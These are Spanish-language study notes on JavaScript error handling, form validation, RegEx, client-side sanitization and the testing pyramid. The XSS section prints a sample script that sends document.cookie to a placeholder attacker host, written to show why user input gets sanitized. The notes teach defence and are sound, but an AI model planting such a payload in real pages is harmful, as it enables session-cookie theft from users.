##### Sin try...catch: Si la validación falla, el programa se detiene.
##### Con try...catch: Si la validación falla con throw el control pasa inmediatamente al bloque catch asociado, permitiendo una recuperación controlada.


try (o la función que está dentro)
lanzamiento: manualmente o js 
Inicio de la Alarma: Señalar que la operación no puede continuar debido a una entrada o estado inválido.

catch: 
manualmente 
Propagación/Transformación: Re-lanzar el error después de haberlo registrado o envuelto en un error de negocio más relevante.



## 2. Object Error

Propiedades clave: message, name, y stack (pila de llamadas).

Creación de instancias: new Error("Mi mensaje de error").


Error: 
Instancia que se crea y se lanza (generalmente usando throw)
Es lo que el bloque catch recibe y lo que te proporciona toda la información necesaria para diagnosticar y resolver el fallo.

Es el constructor base del cual heredan todos los demás tipos de errores
Cuando utilizas throw new Error("Algo salió mal"), estás creando una instancia de este objeto

Propiedades de Error: 
Todo objeto Error estándar viene con al menos las siguientes tres propiedades fundamentales:

1. message
Una descripción textual legible del error
Es el argumento que se pasa al constructor.
Ej de valor: "Archivo no encontrado."

2. name
El nombre del tipo de error
Útil para diferenciar errores en el bloque catch.
Por defecto, es "Error".
Ej de valores: "TypeError", "ReferenceError", "MiErrorPersonalizado"

3. stack
pila de llamadas (call stack).
Es una cadena que muestra la secuencia de funciones
funciones que se llamaron hasta el punto donde se lanzó el error
Ej: at miFuncion (archivo.js:10:5)

```
try {
  throw new Error("Datos de usuario inválidos");
} catch (error) {
  console.log(error.name);    // "Error"
  console.log(error.message); // "Datos de usuario inválidos"
  console.log(error.stack);   // Muestra la ruta de fallo
}
```


Tipos de Errores Nativos (Subclases):
Subclases del Objeto Error para categorizar problemas comunes
##### Cuando ocurre uno de estos errores, el valor de la propiedad name cambia para reflejar el tipo de problema.

1. ReferenceError:
Error al referenciar algo.
Intentar usar una variable o función que no ha sido declarada (console.log(noDeclarada)).

2. TypeError
Uso de un tipo de dato incorrecto.
Intentar llamar a una variable que es un número (no una función)
o intentar leer una propiedad de null o undefined.

3. SyntaxError
Error de gramática del lenguaje.
El motor de JS no puede analizar el código (ej. falta una llave } o un paréntesis )).
No puede ser capturado por try...catch en la función donde ocurre, solo por el entorno externo.

4. RangeError
Un valor numérico está fuera de un rango aceptable
Recursión infinita (la pila de llamadas se desborda)
o usar el constructor Array con un número negativo.

5. URIError
Uso inválido de funciones de URI.
Fallo al usar encodeURI() 
o decodeURI() con caracteres malformados


Errores Personalizados:

#### Para manejar la lógica de negocio es una buena práctica crear tus propias clases de error.
Esto permite al código en el bloque catch reaccionar de forma específica y limpia.

Se consigue heredando de la clase Error base:

```
class SaldoInsuficienteError extends Error {
  constructor(monto) {
    // Llama al constructor del Error base
    super(`El saldo es insuficiente para retirar ${monto}`);
    
    // Establece un nombre específico para diferenciarlo en el catch
    this.name = "SaldoInsuficienteError"; 
    
    // (Opcional) Propiedades adicionales
    this.montoSolicitado = monto;
  }
}
```

Uso: 

```
try {
  throw new SaldoInsuficienteError(500);
} catch (error) {
  if (error.name === "SaldoInsuficienteError") {
    console.warn(`Alerta de negocio: ${error.message}`);
  }
}
```


### Tipos de Errores Nativos Comunes:

SyntaxError (Errores de análisis léxico, no capturables por try...catch en la función donde ocurren).
ReferenceError (Variables no definidas).
TypeError (Uso de un valor donde no se espera, ej. llamar a algo que no es una función).
RangeError (Valores fuera del rango de valores válidos, ej. recursión infinita).
URIError (Errores en funciones encodeURI/decodeURI).



### Creación de Clases de Errores Personalizados

Usando extends Error {...}.
Establecer un name personalizado para una fácil identificación.

Propias clases de error que son más específicas y significativas que los errores nativos de JavaScript, como Error o TypeError.
El objetivo es pasar de errores técnicos (ej. "Referencia no definida")
a errores específicos de tu lógica de negocio (ej. "Saldo Insuficiente" o "Producto Agotado").

Razón: mejorar la clasificación y el manejo selectivo de los errores.

1. Identificación Clara:
Permite distinguir de inmediato un error de validación de un error de red o de base de datos.

2. Manejo Selectivo
En el bloque catch, puedes usar instanceof para ejecutar lógica de recuperación solo para ciertos tipos de errores.

3. Más Contexto
Puedes añadir propiedades adicionales al objeto de error (ej. el código de un producto, el nivel de stock actual) para facilitar la depuración.

3. Código Más Limpio
La lógica de manejo de errores se vuelve más legible y menos propensa a usar cadenas de texto para comparar tipos de error.


Para crear un error personalizado simplemente extiendes la clase base Error 
usando la sintaxis de clases (class extends Error).

```
// Paso 1: Definir la clase que hereda de Error
class SaldoInsuficienteError extends Error {
  // Paso 2: Constructor
  constructor(saldoActual, montoSolicitado) {
    // 2a. Llamar al constructor de la clase base 'Error' (super())
    super(`El saldo (${saldoActual}) es insuficiente para el retiro de ${montoSolicitado}.`);
    
    // 2b. Configurar el nombre del error
    // Esto es crucial para la propiedad 'name' y para el instanceof
    this.name = 'SaldoInsuficienteError'; 
    
    // 2c. (Opcional) Añadir propiedades de contexto
    this.saldo = saldoActual;
    this.monto = montoSolicitado;

    // Nota: Es buena práctica asegurar que la pila de llamadas se capture correctamente
    // En entornos modernos (ES6+), esto es a menudo automático.
  }
}
``` 

Uso: 
Una vez definido el error, puedes usarlo con throw
luego capturarlo y tratarlo de forma específica usando el operador instanceof en el bloque catch

1. Lanzamiento del Error

```
function realizarRetiro(cuenta, monto) {
  if (cuenta.saldo < monto) {
    // Lanzamos la instancia de nuestro error personalizado
    throw new SaldoInsuficienteError(cuenta.saldo, monto); 
  }
  cuenta.saldo -= monto;
  return true;
}
```


2. Captura y Manejo Selectivo

```
const cuentaDeJuan = { saldo: 100 };

try {
  realizarRetiro(cuentaDeJuan, 500); // Esto lanzará nuestro error
} catch (error) {
  // Verificamos si es nuestro error personalizado
  if (error instanceof SaldoInsuficienteError) {
    // Lógica específica para este error (ej. mostrar un pop-up especial)
    console.warn(`💰 ¡ERROR DE NEGOCIO! Saldo insuficiente. Saldo actual: ${error.saldo}`);
    console.log("Acción: Sugerir depósito al usuario.");
    
  } else if (error instanceof TypeError) {
    // Lógica para un error nativo diferente (ej. si pasamos un string en lugar de un número)
    console.error("⛔ Error de programación: Tipo de dato incorrecto.");
    
  } else {
    // Errores desconocidos
    console.error("❌ Error no manejado:", error);
  }
}
```

##### Al usar instanceof, puedes tener un único bloque try...catch que maneje múltiples tipos de errores con lógica de recuperación completamente diferente, haciendo tu código mucho más robusto.



### Manejo de Errores con async/await

Usar try...catch alrededor de las llamadas await. Este es el método preferido.
Comprender que await lanza una excepción si la Promesa se rechaza.

Permite usar el familiar bloque try...catch de forma síncrona.

1. await y la Transformación
await trata las Promesas

Promesa Exitosa (Resuelta):
await devuelve el valor de resolución.

Promesa Fallida (Rechazada):
(ej. un fallo de red o un return reject())
await lanza una excepción de JavaScript (un throw implícito).

Gracias a esta transformación, el motor de JavaScript trata el rechazo de la Promesa como un error de tiempo de ejecución que puede ser capturado por un bloque try...catch que lo rodea.


2. Patrón Estándar: try...catch
##### En una función async: envolver la o las llamadas a await dentro de un bloque try...catch.

```
async function obtenerDatosDeUsuario(id) {
  try {
    // 1. Código que puede fallar (ej. la API devuelve un 404)
    const respuesta = await fetch(`https://api.ejemplo.com/usuarios/${id}`);
    
    // 2. Manejo de errores HTTP (la promesa fetch no se rechaza con 404)
    if (!respuesta.ok) {
      // Lanzamos nuestro propio error para ser capturado por el catch de abajo
      throw new Error(`Error HTTP: ${respuesta.status}`); 
    }

    const datos = await respuesta.json();
    return datos;
    
  } catch (error) {
    // 3. Este catch captura:
    //    a) Errores lanzados por el navegador (ej. fallo de red).
    //    b) Errores lanzados por nosotros (ej. el 'throw' del status 404).
    //    c) Errores lanzados por Promesas rechazadas (como 'fetch' o '.json()').
    
    console.error("Fallo al obtener datos del usuario:", error.message);
    
    // Es una buena práctica devolver un valor seguro o un error más limpio
    return null; 
  }
}
```


#### Peligro: Promesas no Awaited
##### Si utilizas await pero no lo envuelves en un try...catch, y la Promesa falla, el error se propagará fuera de la función async.
##### Si el error no es capturado por la función llamadora, se convertirá en un UnhandledPromiseRejection global
(una advertencia en Node.js, y un posible crash en el navegador si no se maneja).

```
// La función NO usa try...catch.
async function fetchDataUnsafe() {
  const data = await Promise.reject(new Error("Fallo sin captura")); // Esto lanza una excepción
  return data;
}

// El error será 'uncaught' a menos que la función llamadora lo maneje.
async function main() {
  try {
    await fetchDataUnsafe(); // El try...catch AQUI sí lo captura
  } catch (e) {
    console.error("Error capturado en main:", e.message); // -> Error capturado en main: Fallo sin captura
  }
}
```



### Mostrar errores en la ui

No solo se trata de capturar el error, sino de traducir ese fallo técnico en un mensaje informativo y amigable para el usuario

#### 1. Captura de Errores (El Front-End try...catch)
##### La primera capa es siempre atrapar los errores que pueden ocurrir, especialmente los provenientes de operaciones asíncronas (como llamadas a APIs).

1. Lógica de API (Async/Await):
Utiliza try...catch alrededor de las llamadas a servicios o funciones que sabes que podrían fallar
(errores de red, timeouts, fallos de parsing).

```
async function obtenerDatos() {
  try {
    const response = await fetch('/api/datos');
    if (!response.ok) {
        // Lanzamos un error si el estado HTTP es 4xx o 5xx
        throw new Error(`HTTP Error: ${response.status}`);
    }
    return await response.json();
  } catch (error) {
    // 1. CAPTURA: El error es atrapado aquí.
    // 2. LLAMADA A MOSTRAR: Llamamos a una función centralizada.
    mostrarErrorUI("Ocurrió un error al cargar los datos.", error.message);
    return null; 
  }
}
```


2. Validación de Formulario: 
Para errores lanzados por validación de inputs (como campos vacíos, formatos incorrectos)
usa try...catch alrededor de la función de envío (submit handler).


#### 2. Centralización y Normalización
La buena práctica es tener una única función central para manejar cómo se presenta un error
Garantiza consistencia en el diseño y el tono.

Tu función central de manejo de errores debería recibir al menos dos argumentos:
1. mensajeAmigable: Lo que el usuario ve ("No pudimos guardar tu perfil").
2. mensajeTecnico (opcional): Lo que el desarrollador ve (el error.message o error.stack).

```
// Función centralizada para mostrar y registrar errores
function mostrarErrorUI(mensajeAmigable, mensajeTecnico) {
  // A. Registro (Logging)
  console.error("Error técnico (Dev):", mensajeTecnico);
  
  // B. Presentación en la UI
  // Llama a las funciones específicas de tu framework/librería
  renderizarMensaje(mensajeAmigable); 
}
```


#### 3. Técnicas de Presentación de errores en la UI

La manera de mostrar el error depende de la gravedad y el contexto:

1. Mensaje junto al Campo (Validación de Formulario)

Para errores de validación (input incorrecto, campo faltante), la mejor UX es mostrar el mensaje directamente al lado del campo que lo causó.

```
function mostrarErrorCampo(campoId, mensaje) {
    const campo = document.getElementById(campoId);
    // Añadir una clase CSS para resaltar el borde del campo en rojo
    campo.classList.add('campo-error');

    // Insertar un <span> o <p> con el mensaje justo debajo
    let elementoMensaje = document.getElementById('error-' + campoId);
    if (!elementoMensaje) {
        elementoMensaje = document.createElement('p');
        elementoMensaje.id = 'error-' + campoId;
        campo.parentNode.insertBefore(elementoMensaje, campo.nextSibling);
    }
    elementoMensaje.textContent = mensaje;
}
//
```


2. Notificaciones Flotantes (Toasts/Alerts)

Ideales para errores no fatales o errores de API que no requieren la detención de la actividad del usuario
(ej. "La notificación falló al enviarse").

Técnica: Usa librerías como Toastify o componentes de tu framework 
(ej. Material UI Snackbar, Bootstrap Toasts).

Características: Desaparecen automáticamente después de unos segundos, pero pueden tener un botón de "cerrar".


#### 3. Modales (Ventanas Emergentes)

Utilizados para errores fatales o críticos que impiden que el usuario continúe o que requieren una acción inmediata
(ej. "Su sesión ha expirado, por favor inicie sesión de nuevo").

Características: Bloquean la interacción con el resto de la página.


#### 4. Manejo de Errores Globales (Último Recurso)

Esto solo debe capturar errores que no se capturaron con try...catch (errores no controlados, o uncaught exceptions).

1. window.onerror (Errores Síncronos)
Captura la mayoría de los errores de JavaScript que no están dentro de un try...catch.

```
window.onerror = function (message, source, lineno, colno, error) {
  // Manejar el error de última instancia
  mostrarErrorUI("Ocurrió un error inesperado. Por favor, recargue la página.", error ? error.message : message);
  // Devolver true suprime el informe de error por defecto del navegador
  return true; 
};
```

2. unhandledrejection (Rechazos de Promesa no Controlados)
Captura Promesas que fueron rechazadas y a las que nunca se les agregó un .catch().

```
window.addEventListener('unhandledrejection', (event) => {
  // event.reason contiene el objeto de error rechazado
  mostrarErrorUI("Error asíncrono no controlado.", event.reason ? event.reason.message : "Desconocido");
  event.preventDefault(); // Opcional: previene el manejo por defecto del navegador
});
```

Nunca muestres el error.stack directamente al usuario final.
Traduce el fallo técnico en un mensaje conciso, actionable (que incite a una acción)
Con una presentación visual clara (color rojo, icono de advertencia).




# Validaciones 

## Fundamentos Validación Client-Side

Mejora la experiencia del usuario (UX) al proporcionar feedback instantáneo.

1. Uso de Atributos HTML5:
required: Asegura que un campo no esté vacío.
minlength/maxlength: Controla la longitud del texto.
min/max: Controla el rango de valores numéricos.
type (ej. email, number, url): Utiliza validación de formato incorporada.
pattern: Uso básico de expresiones regulares (RegEx) para formatos específicos (ej. códigos postales, matrículas).

2. La API de Validación de Restricciones (Constraint Validation API):
Métodos clave: checkValidity(), reportValidity().
Propiedades: validity (objeto que contiene flags como valueMissing, typeMismatch, patternMismatch).
Personalización de mensajes de error con setCustomValidity().

3. Validación con JavaScript Puro (Escuchadores de Eventos):
Uso de eventos submit en formularios y input/change/blur en campos individuales para validar dinámicamente.
Mostrar y ocultar mensajes de error de forma manual junto a los campos.



### Validación Client-Side

Verificación de los datos de un formulario antes de que estos sean enviados al servidor
proceso que se ejecuta directamente en el navegador web del usuario utilizando HTML y JavaScript.

Primera línea de defensa para la calidad de los datos
Mejora significativamente la Experiencia del Usuario (UX).


Ventajas:

1. Feedback Inmediato:
El usuario recibe una advertencia instantánea (ej. borde rojo, mensaje de error)
en cuanto abandona un campo o intenta enviar el formulario, sin esperar la respuesta del servidor.

2. Menos Carga al Servidor:
Reduce el número de solicitudes HTTP innecesarias que contienen datos inválidos.

3. Mejor UX:
Hace que el proceso de rellenar formularios sea más rápido y menos frustrante.


#### Mecanismos validación en el cliente:
Existen dos formas principales de implementar la validación del lado del cliente: HTML5 (declarativa) y JavaScript (programática).

1. Validación Declarativa (HTML5):
Forma más fácil y rápida, y no requiere escribir código JavaScript
Se basa en atributos de HTML que el navegador interpreta automáticamente.

required: Asegura que el campo no esté vacío.
`<input type="text" required>`

type="email": El navegador verifica que el texto siga un formato básico de correo electrónico.
`<input type="email">`

minlength/maxlength: Define el rango permitido para la longitud de una cadena de texto.
`<input minlength="8" maxlength="20">`

min/max: Define el rango de valores para campos numéricos o de fecha.
`<input type="number" min="1" max="100">`

pattern: Permite especificar una Expresión Regular (RegEx) personalizada para formatos complejos
(ej. código postal, formato de teléfono).
`<input pattern="[0-9]{3}-[0-9]{2}">`


2. Validación Programática (JavaScript Puro o Frameworks)
Se usa para validaciones más complejas o cuando necesitas personalizar completamente la experiencia.

#### La API de Restricciones (Constraint Validation API):
JavaScript moderno ofrece una API nativa que interactúa con los atributos HTML5 para verificar y personalizar los errores

`input.checkValidity()`
Devuelve true si el campo cumple con todos los atributos HTML5 (como required, pattern, etc.)
o false en caso contrario.

`input.validity`
Es un objeto que contiene flags booleanos
(ej. valueMissing, typeMismatch, tooLong)
que indican qué restricción ha fallado.

`input.setCustomValidity(mensaje)`
Permite reemplazar el mensaje de error por defecto del navegador con uno personalizado.


#### Manejo de Eventos
La validación con JavaScript puro generalmente se vincula a eventos:

1. Evento submit:
Se utiliza para realizar la validación final de todos los campos antes de que los datos se envíen
Si la validación falla, se llama a event.preventDefault().

2. Eventos input o blur:
Se utilizan para realizar la validación en tiempo real a medida que el usuario escribe o sale de un campo
ofreciendo feedback instantáneo.


Limitaciones:
Es solo una mejora de UX, nunca un mecanismo de seguridad.

1. Seguridad Cero:
Un usuario malicioso puede fácilmente desactivar JavaScript en su navegador o interceptar y modificar los datos enviados al servidor.

2. Validación de Negocio:
No puede verificar la lógica de negocio que requiere acceder a datos del servidor
(ej. "¿El nombre de usuario ya está registrado?" o "¿Hay suficiente stock?").

La validación del lado del cliente siempre debe complementarse con la Validación del Lado del Servidor (Server-Side)



### Atributos HTML5

Forma más sencilla y poderosa de realizar la validación del lado del cliente sin necesidad de escribir JavaScript
El navegador web se encarga de la lógica de verificación basándose en estas etiquetas declarativas.

Estos atributos se añaden directamente a las etiquetas de formulario 
(<input>, <select>, <textarea>) y obligan al navegador a aplicar reglas de validación.

1. Requerimiento de Contenido

required: booleano
Obliga al usuario a rellenar el campo
Si está vacío, el formulario no se enviará, y el navegador mostrará un mensaje por defecto
`<input type="text" required>`


2. Validación de Tipo y Formato
El atributo type es crucial, ya que el navegador ya incluye lógica de validación incorporada para varios tipos.

email: 
Verifica que el valor contenga al menos un @ y un punto (.).
No es una validación de correo perfecta, pero es útil.
`<input type="email" required>`

url:
Verifica que el valor sea una dirección web válida
(ej. que comience con http:// o https://).
`<input type="url">`

number:
Solo permite números
Si se ingresa texto, el navegador lo marca como inválido.
`<input type="number">`

date / time:
Fuerza al campo a contener fechas u horas en el formato estándar
`<input type="date">` 


3. Restricciones de Longitud y Rango
Estos atributos limitan el tamaño o el valor del dato.

minlength:
Define el número mínimo de caracteres permitidos para campos de texto.
`<input minlength="8">`
(Mínimo 8 caracteres)

maxlength:
Define el número máximo de caracteres permitidos.
`<input maxlength="50">`

min:
Define el valor mínimo permitido para campos numéricos (number) o de fecha (date).
`<input type="number" min="18">`
(Mayor o igual a 18)

max:
Define el valor máximo permitido para campos numéricos o de fecha
`<input type="number" max="99">`


4. Atributo pattern (reglas personalizadas)
El más flexible
Permite definir una Expresión Regular (RegEx) que el valor del campo debe igualar exactamente para considerarse válido.
Ideal para formatos estrictos como códigos postales, contraseñas complejas o identificadores específicos.

```
<input 
  type="text" 
  pattern="[A-Z]{3}-[0-9]{4}" 
  title="El formato debe ser AAA-9999 (ej. ABC-1234)"
  required
>
```

##### Importante: El atributo title es crucial aquí, ya que a menudo se utiliza para proporcionar el mensaje de error o pista al usuario cuando la validación del pattern falla.


##### Cuando una restricción de HTML5 falla (ej. dejas un campo required vacío o el pattern no coincide

1. El navegador detiene el envío del formulario (event.preventDefault() es automático).

2. El navegador muestra una burbuja de mensaje de error cerca del campo infractor
Este mensaje es nativo del navegador, pero su contenido puede ser influenciado por el atributo title o por la API de Validación de Restricciones de JavaScript.

3. El campo infractor recibe un pseudo-selector CSS llamado :invalid
Permite a los desarrolladores aplicar estilos visuales (como un borde rojo) para alertar al usuario.



## Expresiones Regulares (RegEx) para Validación

Herramienta fundamental para la validación de formato compleja.

1. Conceptos Fundamentales de RegEx:
Anclas: ^ (inicio) y $ (fin).
Clases de caracteres: \d (dígito), \w (palabra), . (cualquier carácter).
Cuantificadores: + (uno o más), * (cero o más), {n,m} (entre n y m).
Grupos y Alternancia: () y |.

2. Casos de Uso Comunes:
Validación de correos electrónicos.
Validación de contraseñas fuertes (longitud, mayúsculas, números, símbolos).
Validación de números de teléfono y fechas con formato estricto.


### RegEx en client-side

Permite verificar que las cadenas de texto (como contraseñas, correos, o códigos) sigan un patrón o formato estricto.

1. RegEx
Secuencia de caracteres que define un patrón de búsqueda
Es esencialmente un lenguaje en miniatura para describir y hacer coincidir conjuntos de cadenas de texto.

En validación client-side responde: "¿Esta cadena de texto coincide exactamente con el formato que necesito?"
Ej: validar un código que debe ser una letra, seguida de tres dígitos
Cadena Válida: A123, C789
Patrón RegEx: `/^[A-Z]\d{3}$/`

Es crucial porque las validaciones básicas de HTML5 (type="email", minlength) son limitadas
Permite aplicar reglas complejas de lógica de negocio o formato.

Casos de uso:
 
1. Contraseñas Fuertes:
Fuerza la inclusión de mayúsculas, minúsculas, números y símbolos.
minlength solo verifica la longitud, no el contenido.

2. Códigos Postales/ISBN:
Asegura un formato preciso (ej. 5 dígitos, guion, 4 dígitos).
type="text" acepta cualquier texto.

3. Moneda:
Asegura el formato decimal correcto (ej. 1,000.00).
type="number" acepta cualquier número.


Implementación: 
Dos formas principales

1. Uso Declarativo en HTML5 (pattern Attribute)
Esta es la forma más sencilla, ya que permite al navegador manejar el mensaje de error de forma automática.

```
<input 
  type="text" 
  pattern="^\d{4}$" 
  title="Por favor, ingrese un PIN de 4 dígitos."
  required
>
```

pattern="...": Aquí se coloca la expresión regular (sin las barras / /).

title="...": Es crucial.
A menudo se muestra como el mensaje de error al usuario cuando la validación del patrón falla.


2. Uso Programático
##### Para validaciones dinámicas (al escribir), para mostrar mensajes de error personalizados o para usar RegEx en una lógica más compleja
##### usas el método test() del objeto RegExp.

```
// 1. Definir el patrón (ej. una contraseña que requiere mayúsculas, minúsculas y un dígito)
const patronContrasena = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;

const inputUsuario = "MiContrasena123";

if (patronContrasena.test(inputUsuario)) {
  console.log("Contraseña válida.");
} else {
  // Lógica para mostrar el error personalizado
  console.error("La contraseña no cumple con los requisitos.");
}
```


Métodos de RegEx:
Escribir tus propios patrones

1. ^: Ancla de Inicio
El patrón debe comenzar aquí.
Crucial para la validación.
`^A`
Coincidencia con: Apple

2. $: Ancla de Fin
El patrón debe terminar aquí
Crucial para la validación.
`a$`
Coincidencia con: data

3. \d: Clase de Carácter
Coincide con cualquier dígito (0-9).
`\d{3}`
123

4. \w: Clase de Carácter
Coincide con cualquier carácter de palabra 
`(a-z, A-Z, 0-9, _)`
`\w+`
nombre_1

5. .: Metacaracter
Coincide con cualquier carácter (excepto salto de línea).
`a.b`
a-b, a!b
 
6. {n}: Cuantificador
Coincide exactamente n veces.
`\d{5}`
12345

7. {n,m}: Cuantificador
Coincide entre n y m veces.
`\w{6,10}`
De 6 a 10 caracteres de palabra.

8. +: Cuantificador
Coincide una o más veces.
`\d+`
1, 1234

9. `*`: Cuantificador
Coincide cero o más veces.
`a*b`
b, ab, aaab

10. `[]`: Conjunto
Define un conjunto de caracteres permitidos.
`[abc]`
Solo a, b, o c.

 
Importancia de las Anclas (^ y $):
##### Para la validación, siempre debes usar las anclas ^ y $ para asegurar que toda la cadena coincida con tu patrón, y no solo una subcadena dentro de ella.

Sin Anclas (MALO para validación):
`/A\d+/`
coincide con "HolaA123Mundo".

Con Anclas (BUENO para validación):
`/^A\d+$/`
solo coincide con "A123" y rechaza "HolaA123Mundo".



## Validación más compleja y seguridad.

1. Validación Asíncrona:
Casos de uso: Verificar la disponibilidad de un nombre de usuario o correo electrónico en la base de datos antes de enviar el formulario final
Implementación usando Promesas o async/await.

2. Saneamiento (Sanitization) de Datos:
Diferencia clave entre Validación (¿Es válido?) y Saneamiento (¿Es seguro modificarlo?).
Prevención de XSS (Cross-Site Scripting): Eliminación de etiquetas peligrosas (<script>, <iframe>) del input del usuario (ej. usando la biblioteca DOMPurify).
Inyección SQL: Uso de consultas parametrizadas (esto suele manejarse a nivel del controlador de la base de datos/ORM, pero es crucial). 


### Validación Asíncrona en Cliente

##### Verificar la validez de un input de usuario cuando la comprobación requiere una llamada al servidor o alguna operación de larga duración.
A diferencia de la validación síncrona (donde el resultado es inmediato), la validación asíncrona necesita tiempo para obtener una respuesta
requiere manejar Promesas y el estado de carga.

Verificar un campo de formulario que depende de datos externos
que no están disponibles inmediatamente en el navegador.

##### Tiene como dependencia a la db
Si intentaras validar un nombre de usuario de forma síncrona, el navegador se congelaría mientras espera la respuesta de la API, lo cual es una pésima experiencia de usuario
La validación asíncrona resuelve esto permitiendo que el navegador continúe interactuando mientras espera la respuesta.


Flujo de validación asíncrona:

##### El proceso sigue estos pasos en respuesta a un evento (blur, input con debounce):

1. Evento y Debounce:
El usuario modifica el campo.
Se inicia un temporizador (debounce) para no saturar el servidor con peticiones por cada tecla pulsada.

2. Estado de Carga (UI Feedback):
Cuando el debounce expira, se inicia la llamada a la API
y se muestra un indicador de carga (spinner) junto al campo.

3. Llamada a la API:
Se realiza una solicitud fetch o axios al endpoint del servidor
(ej. /api/check-username?user=nombre).

4. Respuesta y Manejo de Errores:

Éxito (Válido): El servidor responde que el nombre de usuario está disponible.
Se oculta el spinner y se muestra un icono de verificación verde.

Fallo (Inválido): El servidor responde (ej. con código 409 Conflict) que el nombre de usuario está en uso.
Se oculta el spinner y se muestra el mensaje de error.

5. Bloqueo del Formulario:
El formulario principal debe permanecer deshabilitado o en un estado de advertencia hasta que todas las validaciones asíncronas hayan finalizado con éxito.


Ej con js:
La implementación moderna se basa en Promesas y async/await.

Función de Validación Asíncrona:

```
// La función debe devolver una Promesa
async function verificarUsuarioDisponible(username) {
  // 1. Mostrar spinner
  mostrarSpinner('username'); 
  
  try {
    const response = await fetch(`/api/check-user?user=${username}`);
    
    // 2. Manejar la respuesta del servidor
    if (response.status === 409) {
      // 409 Conflict: El recurso ya existe (está en uso)
      return { isValid: false, message: 'Este nombre de usuario ya está tomado.' };
    }
    
    // 200 OK: Nombre de usuario disponible
    return { isValid: true };

  } catch (error) {
    // Manejar fallos de red o servidor
    return { isValid: false, message: 'Error de conexión. Intente más tarde.' };
  } finally {
    // 3. Ocultar spinner (se ejecuta siempre)
    ocultarSpinner('username');
  }
}
```


Uso del Debounce:
Para evitar múltiples llamadas a la API mientras el usuario escribe rápidamente, se utiliza la técnica del debounce.

```
let debounceTimer;

document.getElementById('username').addEventListener('input', (e) => {
  clearTimeout(debounceTimer);
  const username = e.target.value;
  
  // Esperar 500ms antes de llamar a la validación asíncrona
  debounceTimer = setTimeout(async () => {
    if (username.length > 3) {
      const resultado = await verificarUsuarioDisponible(username);
      // Actualizar la UI con el resultado (mostrar mensaje de error o check)
      if (!resultado.isValid) {
        mostrarErrorCampo('username', resultado.message);
      } else {
        mostrarExitoCampo('username');
      }
    }
  }, 500);
});
```



### Sanitización de Datos en Client-Side

Práctica crítica de seguridad
Limpiar y modificar el input del usuario
asegurando que no contenga código malicioso o formatos no deseados antes de que sea procesado, enviado al servidor o, lo que es más importante, renderizado en el DOM.

1. Sanitización vs. Validación

Validación:
##### ¿Es válido? ¿Coincide con el formato esperado?
Acepta o rechaza el dato.
Integridad de los datos.

Sanitización:
##### ¿Es seguro? ¿Contiene código malicioso?
Modifica, limpia o elimina partes del dato.
Seguridad (principalmente prevención de XSS).

Ej: Si un usuario escribe $100.50 en un campo de precio
Validación: Rechazaría el valor si espera solo números.
Sanitización: Quitaría el símbolo $ para dejar solo 100.50.


2. Motivo: Prevención de XSS

Prevenir los ataques de Cross-Site Scripting (XSS).
##### Un ataque XSS ocurre cuando un atacante inyecta código JavaScript malicioso (ej. usando etiquetas <script>, <iframe>, o manejadores de eventos como onload) en tu aplicación
el cual luego es ejecutado por el navegador de otro usuario.

Riesgo: Si permites que un usuario envíe el siguiente código en un campo de comentario y luego lo renderizas en la página sin sanitizarlo:

```
<p>Hola mundo!</p>
<script>
  // ¡Código malicioso robando cookies de sesión!
  fetch('http://atacante.com/robar?cookie=' + document.cookie); 
</script>
```

Si este código se inserta en el DOM, el navegador del siguiente usuario ejecutará el script malicioso.

Solución: Eliminación de Etiquetas Peligrosas
consiste en eliminar o neutralizar todas las etiquetas HTML que tienen el potencial de ejecutar código (como <script>, <style>, <iframe>, o atributos como onerror).


3. Mecanismos de Sanitización en JS

Generalmente, se desaconseja intentar sanitizar el código manualmente (por ejemplo, usando replace())
ya que es muy fácil olvidar un caso de uso o una etiqueta peligrosa. 
La mejor práctica es utilizar bibliotecas bien probadas.

#### Uso de DOMPurify (Recomendado):
Biblioteca estándar de la industria para la sanitización de HTML en el navegador.
Toma una cadena de HTML potencialmente insegura
La procesa utilizando el motor del navegador
Solo devuelve el HTML limpio y seguro.

```
// Antes de renderizar HTML introducido por el usuario:
import DOMPurify from 'dompurify';

const inputInseguro = "<h1>Comentario</h1><script>alert('hackeado')</script>";

// Sanitización: elimina la etiqueta <script>
const outputLimpio = DOMPurify.sanitize(inputInseguro); 

// outputLimpio ahora es: <h1>Comentario</h1>
document.getElementById('comentario').innerHTML = outputLimpio;
```


#### Sanear para el Servidor (Remover Caracteres)

##### Si la sanitización no es para HTML, sino para limpiar valores de input antes de enviarlos al servidor, puedes usar funciones simples de JavaScript:

1. Moneda/Números:
Remover caracteres no numéricos.
`input.replace(/[^0-9.]/g, '')`

2. Recortar Espacios:
Remover espacios al inicio y al final.
`input.trim()`

3. Escapado HTML Básico:
Reemplazar < y > por sus entidades HTML.
`input.replace(/</g, '&lt;').replace(/>/g, '&gt;')` 


##### Al igual que la validación, la sanitización del lado del cliente no es una garantía de seguridad.
Un atacante puede sortear la sanitización del cliente
##### el código que se va a persistir o almacenar en la base de datos DEBE SER SIEMPRE SANITIZADO Y VALIDADO EN EL LADO DEL SERVIDOR.

La sanitización del cliente es principalmente una mejora de UX (para limpiar datos de formato antes del envío)
y una capa de defensa adicional contra XSS que previene que código potencialmente malicioso toque tu DOM.



# Testing

## Fundamentos

### 1. Pirámide de Pruebas
Unitarias (más abajo, más rápidas, más numerosas).
Integración (nivel intermedio).
End-to-End (E2E) o UI (más arriba, más lentas, menos numerosas)

Ayuda a la proporción, el alcance y la velocidad ideales de los diferentes tipos de pruebas en un proyecto
Maximizar la confianza y la velocidad de feedback mientras se minimiza el costo y el tiempo de ejecución.

Se divide en tres capas, ordenadas de abajo hacia arriba 

1. Base (Nivel Inferior): Pruebas Unitarias (Unit Tests) 
capa más grande de la pirámide y constituye la mayor parte de tu código de pruebas.
Alcance: Prueba la unidad más pequeña de código de forma aislada (una función, un método, una clase).
Velocidad: Rápidas (se ejecutan en milisegundos).
##### Motivo de Uso: Asegurar que la lógica interna de cada pieza del sistema funciona correctamente, sin depender de la red o la base de datos.
Herramientas Típicas: Jest, Mocha.

2. Medio (Nivel Intermedio): Pruebas de Integración (Integration Tests)
Esta capa es más pequeña que la base, pero sigue siendo robusta.
Alcance: Prueba que diferentes unidades trabajen juntas correctamente
ej. una función que se comunica con una base de datos simulada
controlador que llama a un servicio
o cómo dos componentes de UI se pasan datos
Velocidad: Moderada (más lentas que las unitarias, ya que involucran más dependencias).
Costo: Medio (más complejas de configurar y mantener).
##### Motivo de Uso: Verificar que las interfaces y los contratos entre los componentes funcionen
Herramientas Típicas: Supertest (Node.js), librerías de testing de frameworks de UI.

